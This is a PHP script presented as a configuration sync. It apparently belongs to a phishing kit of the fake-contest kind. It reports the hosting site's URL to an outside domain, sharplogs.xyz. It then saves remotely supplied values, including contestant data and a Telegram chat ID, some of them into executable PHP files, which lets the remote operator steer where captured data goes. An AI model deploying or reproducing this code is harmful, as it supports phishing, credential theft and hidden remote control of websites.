<?php

function fetchAndSaveConfig($url) {
    // Initialize error logging
    $errors = [];
    
    // Fetch data with better error handling
    $response = @file_get_contents($url);
    if ($response === false) {
        $error = "Failed to fetch config from: $url";
        error_log($error);
        die($error);
    }

    // Decode JSON with error checking
    $data = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        $error = "Invalid JSON from API: " . json_last_error_msg();
        error_log($error);
        die($error);
    }

    // Validate required fields
    $requiredFields = ['main_image', 'last_updated', 'contest_data', 'telegram_chat_id', 'time'];
    foreach ($requiredFields as $field) {
        if (!isset($data[$field])) {
            $error = "Missing required field: $field";
            error_log($error);
            die($error);
        }
    }

    // Save image config with error handling
    $imageConfig = [
        'main_image' => $data['main_image'],
        'last_updated' => $data['last_updated'],
    ];
    
    $imageConfigContent = "<?php return " . var_export($imageConfig, true) . ";";
    if (file_put_contents('image_config.php', $imageConfigContent) === false) {
        $errors[] = "Failed to save image_config.php";
    }

    // Save contestant config with error handling
    $contestantConfigContent = "<?php return " . var_export($data['contest_data'], true) . ";";
    if (file_put_contents('contestant_config.php', $contestantConfigContent) === false) {
        $errors[] = "Failed to save contestant_config.php";
    }

    // Save telegram ID with error handling
    if (file_put_contents('telegram_chat_id.txt', $data['telegram_chat_id']) === false) {
        $errors[] = "Failed to save telegram_chat_id.txt";
    }

    // Save time with error handling
    if (file_put_contents('time.txt', $data['time']) === false) {
        $errors[] = "Failed to save time.txt";
    }

    // Log any errors
    if (!empty($errors)) {
        $errorMessage = "Sync errors: " . implode(", ", $errors);
        error_log($errorMessage);
        die($errorMessage);
    }
    
    // Log success
    error_log("Config sync completed successfully at " . date('Y-m-d H:i:s'));
    return true;
}

// Call this with your actual config API
try {
    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
    fetchAndSaveConfig("https://sharplogs.xyz/api/contest-info?source=" . urlencode($currentUrl));
} catch (Exception $e) {
    error_log("Sync config exception: " . $e->getMessage());
    die("Configuration sync failed: " . $e->getMessage());
}
